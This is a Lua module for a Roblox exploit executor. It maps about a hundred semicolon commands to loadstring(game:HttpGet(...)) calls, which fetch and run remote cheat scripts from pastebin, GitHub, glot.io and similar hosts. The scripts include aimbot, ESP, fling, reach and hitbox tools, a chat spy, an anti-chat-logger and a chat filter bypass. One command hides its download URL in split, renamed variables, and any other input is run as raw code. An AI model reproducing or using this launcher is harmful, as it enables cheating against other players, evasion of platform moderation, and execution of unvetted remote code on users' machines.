return function(scriptBox, player)
    local commands = {
        ";krunox", ";dhex", ";qcmd", ";straw",
        ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";sfly", ";fly2", ";sfly2", ";rtt", ";rkt", ";conprint",
        ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bp5", ";bp6", ";bp7", ";bp8", ";bhtool", ";mvtool", ";grtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth", ";rspy", ";antierr",
        ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";invis3", ";tel3", ";roa", ";akp1", ";akp2", ";akp3", ";keyb3", ";keyb4", ";cvb", ";ska", ";reach", ";reach2", ";hitbox", ";aimbot", ";cfling", ";finger", ";finger2", ";spdmtr",
        ";prox", ";rochips", ";fc1", ";fc2", ";synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";cspy", ";slock", ";wibtt", ";acl", ";crouch", ";srp3", ";srp4", ";tptool", ";ngp", ";fling", ";esp", ";radar", ";OCDtool", ";fc4",
        ";rc7", ";cunc", ";keyb2", ";na3", ";backpack", ";backpack2", ";r15anims", ";knpc2",
        ";krnlk (key: 9X1L9ZPAXN4)",
        ";hydroxide",
    }

    local function executeCode(code)
        if code == ";cmds" then
            scriptBox.Text = "Существующие команды:\n" .. table.concat(commands, "\n") .. "\n\nИспользуй ;reloadengine для обновления движка"
        elseif code == ";tptool" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Tptool/refs/heads/main/Tptool "))()
        elseif code == ";jerk" then
            if player.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
                loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw "))()
            else
                loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw "))()
            end
        elseif code == ";synapse" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Synapse-x/refs/heads/main/Synapse%20x "))()
        elseif code == ";conprint" then
            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/FE-console-typer/raw/refs/heads/main/Console%20printer"))()
        elseif code == ";antierr" then
            loadstring(game:HttpGet("https://glot.io/snippets/hcfoitpvco/raw/AntiError.lua "))()
        elseif code == ";rspy" then
            loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
        elseif code == ";slock" then
            loadstring(game:HttpGet("https://glot.io/snippets/h9d5rkcl47/raw/ShiftLock.lua "))()
        elseif code == ";cspy" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/CHAT%20SPY%20-%202025/ChatSpy2025.lua "))()
        elseif code == ";dhex" then
            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Destructed-hex/raw/refs/heads/main/Destructed%20hex%20gui "))()
        elseif code == ";straw" then
            loadstring(game:HttpGet("https://github.com/C-Dr1ve/Strawberry/raw/refs/heads/main/Scanner_Source/V3.00.lua "))()
        elseif code == ";fc4" then
            loadstring(game:HttpGet("https://pastebin.com/raw/H3281zhD "))()
        elseif code == ";r15anims" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua "))()
        elseif code == ";hydroxide" then
            loadstring(game:HttpGet("https://paste.myconan.net/617098.txt "))()
        elseif code == ";knpc2" then
            loadstring(game:HttpGet("https://paste.myconan.net/611639.txt "))()
        elseif code == ";OCDtool" then
            loadstring(game:HttpGet("https://glot.io/snippets/h9l8vsvzz6/raw/OCDT.lua "))()
        elseif code == ";esp" then
            loadstring(game:HttpGet("https://glot.io/snippets/h8wks8n8p4/raw/Esp.lua "))()
        elseif code == ";hitbox" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Hitblox/refs/heads/main/Hitblox "))()
        elseif code == ";cvb" then
            loadstring(game:HttpGet("https://glot.io/snippets/h7je4skic1/raw/cvb.lua "))()
        elseif code == ";ska" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/InstantKillig/refs/heads/main/Coolkillguithingy "))()
        elseif code == ";reach" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/wuxuin/Reach-sword/refs/heads/main/Reach%20sword "))()
        elseif code == ";reach2" then
            loadstring(game:HttpGet("https://glot.io/snippets/h7i90cj5s8/raw/reach.lua "))()
        elseif code == ";cfling" then
            loadstring(game:HttpGet("https://glot.io/snippets/h7t99b052l/raw/FlingTool.lua "))()
        elseif code == ";finger" then
            loadstring(game:HttpGet("https://gitlab.com/sovetskii-shashlik/fingerguiv3/-/raw/main/FingerGuiV3.lua "))()
        elseif code == ";finger2" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/ChomikDev/ShitScripts/refs/heads/main/Finger%20FE.lua ', true))()
        elseif code == ";spdmtr" then
            loadstring(game:HttpGet("https://pastebin.com/raw/WYi7Bm8u "))()
        elseif code == ";fly2" then
            loadstring(game:HttpGet("https://glot.io/snippets/h9empzjulm/raw/FlyGui.lua "))()
        elseif code == ";invis3" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Invis/refs/heads/main/Invistoggle "))()
        elseif code == ";fling" then
            loadstring(game:HttpGet("https://glot.io/snippets/h86gnsdgud/raw/FlingGui.lua "))()
        elseif code == ";ngp" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Gravity-inverter/refs/heads/main/GI "))()
        elseif code == ";rkt" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/RTT-Tool/main/RKT%20Tool "))()
        elseif code == ";radar" then
            loadstring(game:HttpGet("https://glot.io/snippets/h94bz03sm6/raw/Radar.lua "))()
        elseif code == ";bp5" then
            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Shashlik-bring-parts/raw/refs/heads/main/Shashlik%20Bring%20Parts%20v2 "))()
        elseif code == ";bp6" then
            loadstring(game:HttpGet("https://glot.io/snippets/h6k1ijlqsv/raw/vagina.lua "))()
        elseif code == ";bp7" then
            loadstring(game:HttpGet("https://pastebin.com/raw/bbBracWG "))()
        elseif code == ";bp8" then
            loadstring(game:HttpGet("https://glot.io/snippets/h6k1ijlqsv/raw/klitor.lua "))()
        elseif code == ";synapse2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua "))()
        elseif code == ";krnl" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/refs/heads/main/KRNL%20UI%20Remake.lua "))()
        elseif code == ";mvtool" then
            loadstring(game:HttpGet("https://pastefy.app/Vcuyg09O/raw "))()
        elseif code == ";krnl2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfplayer/redemption/main/krnlnoui.lua "))()
        elseif code == ";krnlk" then
            loadstring(game:HttpGet("https://pastebin.com/raw/DfjrwJie "))()
        elseif code == ";akp3" then
            loadstring(game:HttpGet("https://pastebin.com/raw/DfjrwJie "))()
        elseif code == ";rtt" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/RTT-Tool/refs/heads/main/RTT%20Tool "))()
        elseif code == ";bhtool" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Blackhole/refs/heads/main/Blackhole "))()
        elseif code == ";bypass" then
            loadstring(game:HttpGet'https://raw.githubusercontent.com/m1kp0/universal_scripts/refs/heads/main/chat_bypass.lua ')()
        elseif code == ";keyb2" then
            loadstring(game:HttpGet("https://github.com/ltseverydayyou/uuuuuuu/raw/refs/heads/main/VirtualKeyboard.lua "))()
        elseif code == ";na3" then
            loadstring(game:HttpGet("https://github.com/ltseverydayyou/Nameless-Admin/raw/refs/heads/main/Source.lua "))()
        elseif code == ";backpack" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/refs/heads/main/mobileBACKPACK.lua "))()
        elseif code == ";backpack2" then
            loadstring(game:HttpGet("https://glot.io/snippets/h9u1v79k2y/raw/CusInv.lua "))()
        elseif code == ";acl" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua "))()
        elseif code == ";srp4" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Avtor-ring-parts-Updated/refs/heads/main/Avtor%20ring%20parts "))()
        elseif code == ";qcmd" then
            loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw "))()
        elseif code == ";knpc" then
            loadstring(game:HttpGet("https://pastebin.com/raw/DcSXwXqC "))()
        elseif code == ";grtool" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/GrabTool/refs/heads/main/GrabToolFix "))()
        elseif code == ";krunox" then
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krunox-13336 "))()
        elseif code == ";srp2" then
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Open-Source-Ring-Parts-26702 "))()
        elseif code == ";toolgui" then
            loadstring(game:HttpGet("https://pastebin.com/raw/ZvstfPXM "))()
        elseif code == ";srp3" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/sovetskii-shashlik/Super-ring-parts-without-massage/refs/heads/main/Super%20ring%20parts '))()
        elseif code == ";illus" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_11l7Y131YqJjZ31QmV5L8pI23V02b3191sEg26E75472Wl78Vi8870jRv5txZyL1.lua.txt "))()
        elseif code == ";hth" then
            loadstring(game:HttpGet('https://pastefy.app/tI5b3OVD/raw '))()
        elseif code == ";bp4" then
            loadstring(game:HttpGet("https://github.com/sovetskii-shashlik/Shashlik-bring-parts/raw/refs/heads/main/Shashlik%20bring%20parts "))()
        elseif code == ";rc7" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/rc7 "))()
        elseif code == ";search" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher "))()
        elseif code == ";crouch" then
            loadstring(game:HttpGet("https://pastebin.com/raw/sebBaBWi "))()
        elseif code == ";rp2" then
            loadstring(game:HttpGet("https://pastefy.app/hdd1kF9c/raw "))("T.me/AvtorScripts")
        elseif code == ";zomb" then
            loadstring(game:HttpGet('https://pastefy.app/w7KnPY70/raw '))()
        elseif code == ";rp" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Ritual-parts/refs/heads/main/Ritual%20parts%20without%20message "))()
        elseif code == ";wibtt" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/BaconBossScript/Crazy/main/Crazy '))()
        elseif code == ";keyb" then
            loadstring(game:HttpGet('https://pastefy.app/Te4dwSw2/raw '))()
        elseif code == ";roa" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/new/refs/heads/main/cmd.lua "))()
        elseif code == ";fly" then
            loadstring(game:HttpGet('https://pastefy.app/M0N30XXG/raw '))()
        elseif code == ";srp" then
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SUPER-RING-PARTS-V3-WITH-NO-MESSAGE-26385 "))()
        elseif code == ";fc1" then
            loadstring(game:HttpGet('https://pastefy.app/9CDN9Kaj/raw '))()
        elseif code == ";fc2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/CameraSpy/main/Script "))()
        elseif code == ";fc3" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Freecam '))()
        elseif code == ";sfly" then
            loadstring(game:HttpGet("https://glot.io/snippets/h8id91ebrx/raw/supermanfly.lua "))()
        elseif code == ";sfly2" then
            loadstring(game:HttpGet("https://glot.io/snippets/hag0gpvlf0/raw/sfly2.lua "))()
        elseif code == ";tfling" then
            loadstring(game:HttpGet("https://pastebin.com/raw/rfKaavP3 "))()
        elseif code == ";tfling2" then 
            loadstring(game:HttpGet('https://pastebin.com/raw/TXMNj1yy '))()
        elseif code == ";avtor" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Avtor1zaTion/Avtor/main/AvtorHub '))()
        elseif code == ";gh" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub '))()
        elseif code == ";keyb3" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt "))()
        elseif code == ";keyb4" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt "))()
        elseif code == ";na2" then
            loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-admin-14114 "))()
        elseif code == ";tictactoe" then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/refs/heads/main/Tic%20Tac%20Toe '))()
        elseif code == ";inf" then
            loadstring(game:HttpGet("https://github.com/mxsynry/infiniteyield-reborn/raw/refs/heads/master/source "))()
        elseif code == ";na1" then
            loadstring(game:HttpGet("https://github.com/Silly-Exploiter/NamedAdmin/raw/refs/heads/main/Script "))()
        elseif code == ";le" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Lelele-bypasser/refs/heads/main/LeLeBypasser.txt "))()
        elseif code == ";bp1" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/Bac0nHck/Scripts/main/BringFlingPlayers "))()
        elseif code == ";bp2" then
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Better-Bring-Parts-Ui-SOLARA-and-Fixed-Lags-21780 "))()
        elseif code == ";bp3" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/GoofyBlox/GoofyZ/refs/heads/main/Best/VorteX.lua "))()
        elseif code == ";tel1" then
            loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-FE-Telekinesis-15523 "))()
        elseif code == ";tel2" then
            loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty11.lua "))()
        elseif code == ";glios" then
            writefile(".nonecing", "white")
            loadstring(game:HttpGet('https://glot.io/snippets/gua2ntmbdm/raw/main.lua '))()
        elseif code == ";punch" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/punch ",true))()
        elseif code == ";akp1" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main ", true))()
        elseif code == ";akp2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/Anti-kill-parts-updated-/refs/heads/main/Anti%20kill%20parts%20by%20Zephyr "))()
        elseif code == ";tel3" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/sakupenXD/SakupScripts/main/Telekinesis "))()
        elseif code == ";invis" then
            loadstring(game:HttpGet("https://pastebin.com/raw/3Rnd9rHf "))()
        elseif code == ";cunc" then
            loadstring(game:HttpGet("https://glot.io/snippets/h4d9a8gprw/raw/main.lua "))()
        elseif code == ";prox" then
            for i,v in ipairs(workspace:GetDescendants()) do
                if v.ClassName == "ProximityPrompt" then
                    v.HoldDuration = 0
                end
            end
        elseif code == ";invis2" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudHub111/Scripts/refs/heads/main/Fe%20Invisible%20Beta ", Beta))()
        elseif code == ";rochips" then
            local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/ "
            local im,lonely,z_c=task.wait,game,loadstring
            z_c(lonely:HttpGet(z_z..""..z_x))()
            return ("This will load in about 2 - 30 seconds" or "according to your device and executor")
        else
            local success, errorMessage = pcall(function()
                loadstring(code)()
            end)
            if not success then
                warn("Execution error:", errorMessage)
            end
        end
    end

    return {
        executeCode = executeCode,
        commands = commands
    }
end